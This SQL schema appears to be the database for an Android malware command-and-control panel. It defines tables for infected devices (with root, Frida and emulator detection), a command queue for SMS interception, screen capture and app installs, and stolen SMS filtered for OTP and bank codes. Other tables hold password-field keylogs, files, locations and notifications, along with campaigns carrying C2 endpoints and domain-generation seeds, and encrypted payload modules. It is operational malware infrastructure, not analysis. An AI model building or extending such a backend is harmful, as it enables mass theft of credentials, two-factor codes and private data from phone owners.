-- Devices table: every phone that checks in
CREATE TABLE devices (
    device_id TEXT PRIMARY KEY,                          -- UUID, unique per physical device
    fingerprint TEXT NOT NULL UNIQUE,                   -- SHA256(SERIAL + ANDROID_ID + Build.FINGERPRINT)
    campaign_id TEXT NOT NULL,                          -- Links to campaign that deployed this
    env_key_hash TEXT NOT NULL,                         -- SHA256 of derived environmental key (for validation)
    first_seen TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_heartbeat TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    os_version INTEGER,                                 -- Android API level
    manufacturer TEXT,
    model TEXT,
    rooted BOOLEAN DEFAULT FALSE,
    frida_detected BOOLEAN DEFAULT FALSE,
    emulator BOOLEAN DEFAULT FALSE,
    country_code TEXT,                                  -- MCC (Mobile Country Code)
    operator TEXT,                                      -- Carrier name
    
    -- Session state
    current_session_id TEXT,
    session_key_id TEXT,                               -- For key rotation tracking
    
    -- Metadata
    user_agent TEXT,
    imei TEXT,                                          -- WARNING: sensitive, encrypt in DB
    phone_number TEXT,                                  -- WARNING: sensitive, encrypt in DB
    
    -- Stats
    data_exfilled_mb REAL DEFAULT 0,
    commands_executed INTEGER DEFAULT 0,
    
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (campaign_id) REFERENCES campaigns(campaign_id)
);

CREATE INDEX idx_devices_campaign ON devices(campaign_id);
CREATE INDEX idx_devices_active ON devices(is_active);
CREATE INDEX idx_devices_last_seen ON devices(last_seen);
CREATE INDEX idx_devices_fingerprint ON devices(fingerprint);

-- Commands table: per-device command queue
CREATE TABLE commands (
    command_id TEXT PRIMARY KEY,                        -- UUID
    device_id TEXT NOT NULL,
    command_type TEXT NOT NULL,                        -- "sms_intercept", "screen_capture", "install_app", etc.
    priority INTEGER DEFAULT 0,                        -- 0=normal, 1=high, 2=critical
    payload BLOB,                                       -- Encrypted command data
    status TEXT DEFAULT 'pending',                     -- pending, sent, acked, executed, failed
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    sent_at TIMESTAMP,
    executed_at TIMESTAMP,
    result TEXT,                                        -- Result data (encrypted)
    error_msg TEXT,
    retry_count INTEGER DEFAULT 0,
    max_retries INTEGER DEFAULT 3,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id),
    FOREIGN KEY (campaign_id) REFERENCES campaigns(campaign_id)
);

CREATE INDEX idx_commands_device ON commands(device_id);
CREATE INDEX idx_commands_status ON commands(status);
CREATE INDEX idx_commands_priority ON commands(priority DESC);

-- Sessions table: track active connections
CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY,                        -- UUID
    device_id TEXT NOT NULL,
    connection_type TEXT NOT NULL,                     -- "websocket", "fcm", "mqtt", "dns", "sms"
    session_key BLOB NOT NULL,                         -- Encrypted session key for this connection
    sequence_num INTEGER DEFAULT 0,                    -- Anti-replay counter
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_activity TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,                              -- Session timeout
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_sessions_device ON sessions(device_id);
CREATE INDEX idx_sessions_active ON sessions(is_active);
CREATE INDEX idx_sessions_expires ON sessions(expires_at);

-- Exfiltrated data: SMS, calls, contacts, etc.
CREATE TABLE exfil_sms (
    sms_id TEXT PRIMARY KEY,
    device_id TEXT NOT NULL,
    phone_number TEXT,                                  -- Encrypted
    body TEXT,                                          -- Encrypted (filtered: OTP/bank keywords only)
    timestamp TIMESTAMP,
    direction TEXT,                                     -- 'incoming', 'outgoing'
    is_otp BOOLEAN,                                    -- Detected as 2FA
    received_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_exfil_sms_device ON exfil_sms(device_id);
CREATE INDEX idx_exfil_sms_is_otp ON exfil_sms(is_otp);
CREATE INDEX idx_exfil_sms_received ON exfil_sms(received_at);

CREATE TABLE exfil_notifications (
    notif_id TEXT PRIMARY KEY,
    device_id TEXT NOT NULL,
    app_package TEXT,
    title TEXT,                                         -- Encrypted
    body TEXT,                                          -- Encrypted
    timestamp TIMESTAMP,
    received_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_exfil_notif_device ON exfil_notifications(device_id);
CREATE INDEX idx_exfil_notif_app ON exfil_notifications(app_package);

CREATE TABLE exfil_keylog (
    keylog_id TEXT PRIMARY KEY,
    device_id TEXT NOT NULL,
    app_package TEXT,
    field_type TEXT,                                   -- 'password', 'url', 'search', 'text'
    content TEXT,                                       -- Encrypted
    timestamp TIMESTAMP,
    received_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_exfil_keylog_device ON exfil_keylog(device_id);
CREATE INDEX idx_exfil_keylog_field ON exfil_keylog(field_type);

CREATE TABLE exfil_files (
    file_id TEXT PRIMARY KEY,
    device_id TEXT NOT NULL,
    file_path TEXT,
    file_name TEXT,
    file_size INTEGER,
    mime_type TEXT,
    file_data BLOB,                                     -- Encrypted
    sha256 TEXT,                                        -- Hash for dedup
    received_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_exfil_files_device ON exfil_files(device_id);
CREATE INDEX idx_exfil_files_sha256 ON exfil_files(sha256);

CREATE TABLE exfil_locations (
    location_id TEXT PRIMARY KEY,
    device_id TEXT NOT NULL,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    timestamp TIMESTAMP,
    received_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_exfil_location_device ON exfil_locations(device_id);
CREATE INDEX idx_exfil_location_timestamp ON exfil_locations(timestamp);

-- Campaigns: track each deployment operation
CREATE TABLE campaigns (
    campaign_id TEXT PRIMARY KEY,
    operator_id TEXT NOT NULL,                         -- Who created this
    campaign_name TEXT NOT NULL,
    target_profile TEXT,                               -- JSON: device type filters
    c2_endpoints TEXT NOT NULL,                        -- JSON array of C2 URLs
    c2_key_pair TEXT NOT NULL,                         -- Encrypted keypair for this campaign
    dga_seed TEXT,                                      -- Domain generation seed
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,                              -- Campaign expiry (auto-disable after)
    is_active BOOLEAN DEFAULT TRUE,
    device_count INTEGER DEFAULT 0,
    data_received_mb REAL DEFAULT 0,
    
    FOREIGN KEY (operator_id) REFERENCES operators(operator_id)
);

CREATE INDEX idx_campaigns_operator ON campaigns(operator_id);
CREATE INDEX idx_campaigns_active ON campaigns(is_active);

-- Operators: panel access control
CREATE TABLE operators (
    operator_id TEXT PRIMARY KEY,                      -- UUID
    username TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,                       -- Bcrypt
    email TEXT,
    role TEXT DEFAULT 'user',                         -- 'admin', 'user', 'readonly'
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    ip_whitelist TEXT                                  -- JSON array of allowed IPs
);

-- Modules: pre-built payload modules
CREATE TABLE modules (
    module_id TEXT PRIMARY KEY,
    module_type TEXT NOT NULL,                         -- "sms", "camera", "screen", "keylog", etc.
    version TEXT,
    encrypted_dex BLOB NOT NULL,                       -- Encrypted DEX bytecode
    encrypted_so BLOB,                                 -- Encrypted native library (optional)
    config BLOB,                                       -- Encrypted default config
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    sha256 TEXT UNIQUE,                                -- Hash for integrity check
    size_bytes INTEGER
);

CREATE INDEX idx_modules_type ON modules(module_type);

-- Audit log: track all sensitive operations
CREATE TABLE audit_log (
    log_id TEXT PRIMARY KEY,
    operator_id TEXT,
    action TEXT NOT NULL,                              -- "device_enrolled", "command_sent", "data_viewed", etc.
    resource_type TEXT,                                -- "device", "command", "campaign"
    resource_id TEXT,
    details TEXT,                                      -- JSON: additional context
    ip_address TEXT,
    timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (operator_id) REFERENCES operators(operator_id)
);

CREATE INDEX idx_audit_operator ON audit_log(operator_id);
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp);
CREATE INDEX idx_audit_action ON audit_log(action);

-- Key rotation table: track session key versions
CREATE TABLE key_rotations (
    rotation_id TEXT PRIMARY KEY,
    device_id TEXT NOT NULL,
    old_key_id TEXT,
    new_key_id TEXT,
    rotation_timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    confirmed_at TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);

CREATE INDEX idx_key_rotations_device ON key_rotations(device_id);

PRAGMA foreign_keys = ON;
